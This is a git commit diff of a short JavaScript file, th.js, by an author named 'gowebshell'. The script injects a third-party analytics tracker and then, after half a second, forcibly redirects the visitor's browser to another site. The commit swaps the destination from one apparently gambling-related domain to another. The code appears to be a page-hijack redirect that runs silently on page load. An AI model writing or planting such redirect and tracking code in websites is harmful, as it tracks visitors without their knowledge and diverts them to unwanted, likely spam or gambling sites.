d95bce2fefd85a9b02a754c06f482c226e612d5a
gowebshell <MinnieWSonnier30+github@gmail.com>
2023-10-16 08:28:41 -0300

    Update th.js

--- th.js
+++ th.js
@@ -1,5 +1,5 @@
 document.write('<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>');
 document.write('<script>LA.init({id:"3GA0lNgcmuQlTni3",ck:"3GA0lNgcmuQlTni3"})</script>');
 setTimeout(function(){
-    window.location.href = 'https://www.pgslots.tv/';
+    window.location.href = 'https://z169999.com/';
 },500);
